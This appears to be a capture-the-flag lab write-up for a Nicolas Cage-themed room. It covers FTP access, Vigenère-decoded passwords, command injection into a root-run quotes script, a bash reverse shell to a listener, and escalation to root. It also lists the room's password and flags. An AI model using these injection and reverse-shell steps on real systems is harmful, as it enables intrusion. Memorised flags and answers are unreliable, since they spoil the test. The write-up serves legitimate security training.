---
Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
---

```anonymous (no pass)
ftp 10.10.65.125
```

```download
get dad_tasks
```
[vigener-solver](https://www.guballa.de/vigenere-solver)

> Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.
In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

### ssh

==weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes==  (weston found in source code also question)

```
sudo -l
```

```msg
sudo /usr/bin/bees
```

> Broadcast message from weston@national-treasure (pts/0) (Sat Aug 13 16:52:24 20                                                                               
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!! (through wall)

```files owned by cage
find / -type f -user cage 2>/dev/null
```

`/opt/.dads_scripts/spread_the_quotes.py`
`/opt/.dads_scripts/.files/.quotes`

```
cat /opt/.dads_scripts/spread_the_quotes.py
```

> #!/usr/bin/env python
#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random
lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

```some quotes
cat /opt/.dads_scripts/.files/.quotes
```

#### reverse shell
`cat > some.sh << EOF-EOF block to print the contents enclosed within this block in the terminal. `

```
cat > /tmp/shell.sh << EOF
```

*write* #!/bin/bash
bash -i >& /dev/tcp/*vpn-ip*/4444 0>&1
EOF

or just nano

> cat /tmp/shell.sh
#!/bin/bash
bash -i >& /dev/tcp/*vpn-ip*/4444 0>&1

```
chmod +x /tmp/shell.sh
```

```
printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

##### netcat(kali machine)

```
rlwrap nc -nlvp 4444 
```

```cage
ls
```

```
cat Super_Duper_Checklist
```

> 1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: ==THM{M37AL_0R_P3N_T35T1NG}==

### priv esc

```to check the 3 emails
cat email_backup/*
```

> found cageisnotalegend and key face [vigenere-tool](https://www.boxentriq.com/code-breaking/vigenere-cipher) 

==cageisnotalegend==

```not terminal error
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```enter pass
su root
```
`pass: cageisnotalegend`

```
cat /root/email_backups/*
```

==THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}==


- What is Weston's password?*Mydadisghostrideraintthatcoolnocausehesonfirejokes*
- What's the user flag?*THM{M37AL_0R_P3N_T35T1NG}*
- What's the root flag?*THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}*

[[Gotta Catch'em All!]]